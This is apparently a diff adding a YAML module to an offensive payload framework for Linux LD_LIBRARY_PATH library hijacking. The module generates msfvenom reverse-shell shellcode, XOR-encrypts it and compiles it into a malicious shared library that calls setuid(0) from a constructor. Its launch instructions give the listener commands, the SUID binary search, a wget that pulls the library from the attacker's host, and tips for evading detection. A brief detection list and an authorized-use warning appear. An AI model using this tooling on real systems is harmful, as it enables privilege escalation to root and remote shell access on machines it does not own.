@@ -1,0 +1,206 @@
+meta:
+  name: "C Linux LD_LIBRARY_PATH Shared Library Hijacking"
+  category: "Persistence"
+  description: |
+    Shared library hijacking via LD_LIBRARY_PATH for privilege escalation on Linux.
+    
+    Features:
+    - Creates malicious version of target library
+    - Uses constructor attribute for automatic execution
+    - XOR-encrypted shellcode (key: 0xfa)
+    - Attempts setuid(0)/setgid(0) for privilege escalation
+    - Executes before main() via __attribute__((constructor))
+    
+    This technique exploits programs with SUID bit that use dynamic libraries.
+    By placing a malicious library in a directory specified by LD_LIBRARY_PATH,
+    you can execute code when the SUID binary loads the library.
+    
+    WARNING: For authorized security testing only!
+
+  effectiveness: "medium"
+
+  mitre:
+    tactic: "TA0004 - Privilege Escalation"
+    technique: "T1574.007 - Hijack Execution Flow: Path Interception by PATH Environment Variable"
+
+  artifacts:
+    - "Malicious shared library (.so file)"
+    - "LD_LIBRARY_PATH environment variable set"
+    - "Constructor function execution before main()"
+    - "setuid(0)/setgid(0) privilege escalation attempts"
+    - "mprotect() calls to make memory executable"
+
+parameters:
+  - name: "lhost"
+    type: "ip"
+    description: "Attacker/C2 server IP address for reverse connection"
+    required: true
+
+  - name: "lport"
+    type: "port"
+    description: "Listener port on attacker machine"
+    required: true
+    default: 443
+
+  - name: "xor_key"
+    type: "hex"
+    description: "XOR encryption key (single byte, e.g., 'fa')"
+    required: false
+    default: fa
+
+  - name: "target_library"
+    type: "string"
+    description: "Name of library to hijack (e.g., 'gpgrt' for libgpgrt.so)"
+    required: true
+    default: "gpgrt"
+
+  - name: "output_file"
+    type: "string"
+    description: "Output shared library filename (will be prefixed with 'lib' and suffixed with '.so')"
+    required: false
+    default: "libhijack.so"
+
+  - name: "output_path"
+    type: "path"
+    description: "Output directory for generated payload"
+    required: false
+    default: "{config.output_dir}"
+
+preprocessing:
+  # Step 1: Generate raw shellcode using msfvenom
+  - type: "command"
+    name: "generate_shellcode"
+    command: "msfvenom -p linux/x64/shell_reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} -f raw"
+    output_var: "raw_shellcode"
+
+  # Step 2: XOR encrypt the shellcode
+  - type: "script"
+    name: "xor_encryption"
+    script: "xor_encrypt.py"
+    args:
+      data: "{{ raw_shellcode }}"
+      key: "{{ xor_key }}"
+    output_var: "xor_result"
+
+  # Step 3: Format encrypted shellcode as C byte array
+  - type: "script"
+    name: "format_payload"
+    script: "format_c.py"
+    args:
+      data: "{{ xor_result.encrypted }}"
+      var_name: "buf"
+      bytes_per_line: 15
+    output_var: "c_payload"
+
+output:
+  type: "template"
+  template: "persistence/ld_library_path.c"
+  compile:
+    enabled: true
+    command: "gcc -Wall -fPIC -z execstack -shared -o {{ output_path }}/lib{{ target_library }}.so {{ source_file }} -ldl"
+  launch_instructions: |
+    C Linux LD_LIBRARY_PATH Shared Library Hijacking - Launch Instructions
+
+    Step 1: Start Listener
+
+    On attacker machine:
+    nc -lvnp {{ lport }}
+
+    Or using Metasploit:
+    msfconsole -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; exploit"
+
+    Step 2: Find SUID Binaries with Dynamic Libraries
+
+    On target, find SUID binaries:
+    find / -perm -u=s -type f 2>/dev/null
+
+    Check which libraries they use:
+    ldd /path/to/suid_binary
+
+    Identify hijackable libraries (those you can create malicious versions of).
+
+    Step 3: Transfer Malicious Library to Target
+
+    Transfer the generated shared library to the target Linux system:
+
+    Using Python HTTP server:
+    python3 -m http.server 8080
+
+    On target:
+    mkdir -p /tmp/lib
+    wget http://{{ lhost }}:8080/lib{{ target_library }}.so -O /tmp/lib/lib{{ target_library }}.so
+    chmod +x /tmp/lib/lib{{ target_library }}.so
+
+    Step 4: Hijack Library Load Path
+
+    Set LD_LIBRARY_PATH to point to malicious library directory:
+    export LD_LIBRARY_PATH=/tmp/lib:$LD_LIBRARY_PATH
+
+    Step 5: Execute SUID Binary
+
+    Run the SUID binary that loads your target library:
+    /path/to/suid_binary
+
+    If successful:
+    - Library constructor executes before main()
+    - setuid(0) escalates to root
+    - Shellcode executes with root privileges
+    - Reverse shell connects to your listener
+
+    Notes:
+
+    - Encrypted with XOR key 0x{{ xor_key }}
+    - Uses __attribute__((constructor)) for automatic execution
+    - Attempts privilege escalation via setuid(0)/setgid(0)
+    - Works on x64 Linux systems
+    - Requires SUID binary that loads the target library
+    - Some systems ignore LD_LIBRARY_PATH for SUID binaries (security feature)
+
+    Common Target Libraries:
+
+    - libgpgrt.so (GPG error library)
+    - libcrypto.so (OpenSSL crypto)
+    - libz.so (zlib compression)
+    - libpthread.so (POSIX threads)
+
+    Find SUID programs using specific library:
+    for i in $(find / -perm -u=s -type f 2>/dev/null); do ldd $i 2>/dev/null | grep -q "{{ target_library }}" && echo $i; done
+
+    Evasion Tips:
+
+    - Name library identically to legitimate one
+    - Match version numbers (libfoo.so.1.2.3)
+    - Include stub functions from original library (use objdump/nm to identify)
+    - Hide in unexpected but valid library paths
+
+    Troubleshooting:
+
+    - Library not loaded: SUID binary may ignore LD_LIBRARY_PATH (secure mode)
+    - No privilege escalation: setuid() may fail if not SUID binary
+    - Symbol not found errors: Add more stub functions matching target library
+    - No execution: Verify SUID binary actually loads your target library
+
+    Alternative - RPATH Injection:
+
+    Some binaries have RPATH set, which takes precedence:
+    Check RPATH:
+    readelf -d /path/to/binary | grep RPATH
+
+    If RPATH is writable, place malicious library there instead.
+
+    Detection:
+
+    Defenders can detect this via:
+    - Monitor LD_LIBRARY_PATH in process environment
+    - Check for libraries loaded from unusual paths
+    - Audit SUID binaries and their library dependencies
+    - lsof to see which libraries are loaded
+
+    Cleanup:
+
+    Remove environment variable:
+    unset LD_LIBRARY_PATH
+
+    Remove library:
+    rm /tmp/lib/lib{{ target_library }}.so
+    rmdir /tmp/lib
